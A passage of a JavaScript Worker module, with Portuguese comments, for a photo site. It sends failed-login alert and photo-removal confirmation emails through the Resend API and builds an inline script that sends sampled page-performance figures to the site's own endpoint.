      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

// Alerta de tentativas de login falhas — sem isso, um ataque de força bruta a
// /dashboard/login é silencioso: o rate limit segura o volume, mas ninguém
// fica sabendo que houve tentativa.
//
// Mesmo contrato do sendErrorAlert: nunca lança, cooldown próprio, sem corpo
// de requisição. IP entra truncado — dado de segurança legítimo (LGPD art. 7º,
// IX + art. 16, I) mas sem precisão total num e-mail.
const LOGIN_ALERT_COOLDOWN_SECS = 1800;

/**
 * @param {Env} env
 * @param {{ ip: string, attempts: number, windowMins: number, userAgent?: string }} info
 */
export async function sendLoginAlert(env, { ip, attempts, windowMins, userAgent }) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !env.ADMIN_EMAIL) return false;
  try {
    const cooldownKey = 'login-alert:cooldown';
    if (await env.FOTOS.get(cooldownKey)) return false;
    await env.FOTOS.put(cooldownKey, '1', { expirationTtl: LOGIN_ALERT_COOLDOWN_SECS });
  } catch { /* falha de KV não pode engolir o alerta nem quebrar o login */ }

  const esc = escape;
  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🔐 Tentativas de login no painel</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com/dashboard</p>
  <p style="font-size:14px;line-height:1.6">Foram registradas <strong>${esc(attempts)}</strong> tentativas de login malsucedidas nos últimos ${esc(windowMins)} minutos.</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Origem (IP)</td><td style="padding:8px 0">${esc(ip)}</td></tr>
    ${userAgent ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Navegador</td><td style="padding:8px 0;font-size:12px;color:#555">${esc(userAgent)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date().toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:20px;font-size:13px;line-height:1.6;color:#444">Se não foi você: troque a senha em <strong>/dashboard → Configurações</strong>. A troca também encerra todas as outras sessões abertas.</p>
  <p style="margin-top:20px;font-size:12px;color:#bbb">Próximos alertas ficam em silêncio por ${Math.round(LOGIN_ALERT_COOLDOWN_SECS / 60)} min.</p>
</div>`;

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        from: 'Fotos <noreply@lucafchala.com>',
        to: [env.ADMIN_EMAIL],
        subject: '🔐 Tentativas de login no painel — fotos.lucafchala.com',
        html,
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

/**
 * @param {Env} env
 * @param {Pedido} req
 */
export async function sendConfirmationEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey || !req.email) return false;

  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant
  const methodLabel = /** @type {Record<string, string>} */ ({ number: 'Número da foto', url: 'Link da foto', upload: 'Arquivo enviado' })[req.method] || req.method;

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">Solicitação recebida</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">fotos.lucafchala.com</p>
  <p style="font-size:14px;line-height:1.6;margin-bottom:16px">Olá! Confirmamos o recebimento do seu pedido de remoção de foto do projeto <strong>${esc(req.eventTitle)}</strong>.</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Projeto</td><td style="padding:8px 0"><strong>${esc(req.eventTitle)}</strong></td></tr>
    <tr><td style="padding:8px 0;color:#666">Tipo</td><td style="padding:8px 0">${esc(methodLabel)}</td></tr>
    ${req.value ? `<tr><td style="padding:8px 0;color:#666">Identificação</td><td style="padding:8px 0">${esc(req.value)}</td></tr>` : ''}
    ${req.message ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(req.message)}</td></tr>` : ''}
  </table>
  <p style="margin-top:24px;font-size:14px;line-height:1.6;color:#444">Analisaremos o pedido em breve.</p>
  <p style="margin-top:12px;font-size:13px;line-height:1.6;color:#666">Em caso de dúvidas, fale comigo pelo <a href="https://wa.me/5511989211178" style="color:#888">WhatsApp</a> ou por <a href="mailto:suporte@lucafchala.com" style="color:#888">suporte@lucafchala.com</a>.</p>
  <p style="margin-top:16px;font-size:12px;color:#bbb">Luca F. Chala · fotos.lucafchala.com</p>
</div>`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    signal: AbortSignal.timeout(EMAIL_TIMEOUT_MS),
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from: 'Fotos <noreply@lucafchala.com>',
      to: [req.email],
      subject: `Solicitação recebida — ${req.eventTitle}`,
      html,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.status);
    throw new Error(`Resend ${res.status}: ${text}`);
  }
  return true;
}

// Percentual de visitas que enviam o beacon de performance. Cada envio custa
// uma requisição de Worker (cota gratuita: 100 mil/dia), então amostramos: 10%
// já dá volume de sobra para medir tendência sem competir com o tráfego real.
const PERF_SAMPLE_RATE = 0.1;

// Script no <head>: precisa existir antes das <img> serem parseadas, senão
// uma imagem já em cache dispara onload antes de imgSettled existir e o
// shimmer gira para sempre. Duração vem de Resource Timing do próprio
// browser — cross-origin (fotos são do Google) zera os tempos detalhados sem
// Timing-Allow-Origin, mas `duration` continua exposto.
//
// Um beacon por visita (visibilitychange), não por imagem — evitaria repetir
// o mesmo problema de cota que descartou o cache via Worker.
/**
 * @param {string} page
 * @param {boolean} enabled
 * @param {string} [nonce]
 */
export function perfBootScript(page, enabled, nonce = '') {
  return `<script${nonce ? ` nonce="${nonce}"` : ''}>(function(){
  var busy=function(el,on){if(!el)return;if(on)el.setAttribute('aria-busy','true');else el.removeAttribute('aria-busy');};
  window.imgSettled=function(img,ok){var p=img&&img.parentElement;if(!p)return;p.classList.remove('loading');busy(p,false);if(!ok&&img.style)img.style.opacity='0';};
  window.perfMark=function(k,v){var m=window.__perf;if(m&&k in m.marks)m.marks[k]=v;};
  window.perfCount=function(k){var m=window.__perf;if(m&&typeof m.marks[k]==='number')m.marks[k]++;};
${enabled ? `  if(Math.random()>=${PERF_SAMPLE_RATE})return;
  var m={page:${JSON.stringify(page)},marks:{filterMs:null,navCount:0}};
  window.__perf=m;
  function pct(a,q){if(!a.length)return null;var s=a.slice().sort(function(x,y){return x-y;});return Math.round(s[Math.min(s.length-1,Math.floor(s.length*q))]);}
  var sent=false;
  function flush(){
    if(sent)return;sent=true;
    var imgs=[],nav=null,lcp=null,fcp=null;
    try{
      var rs=performance.getEntriesByType('resource');
      for(var i=0;i<rs.length;i++){if(rs[i].initiatorType==='img'&&rs[i].duration>0)imgs.push(rs[i].duration);}
      var ns=performance.getEntriesByType('navigation')[0];
      if(ns)nav={ttfb:Math.round(ns.responseStart),dcl:Math.round(ns.domContentLoadedEventEnd),load:Math.round(ns.loadEventEnd)};
      var le=performance.getEntriesByType('largest-contentful-paint');
      if(le.length)lcp=Math.round(le[le.length-1].startTime);
      var fe=performance.getEntriesByName('first-contentful-paint');
      if(fe.length)fcp=Math.round(fe[0].startTime);
    }catch(e){}
    var body=JSON.stringify({page:m.page,fcp:fcp,lcp:lcp,nav:nav,imgCount:imgs.length,imgP50:pct(imgs,.5),imgP95:pct(imgs,.95),filterMs:m.marks.filterMs,navCount:m.marks.navCount,vw:innerWidth});
    try{navigator.sendBeacon('/api/perf',new Blob([body],{type:'application/json'}));}catch(e){}
  }
  addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')flush();});
  addEventListener('pagehide',flush);` : ''}
})();</script>`;
}
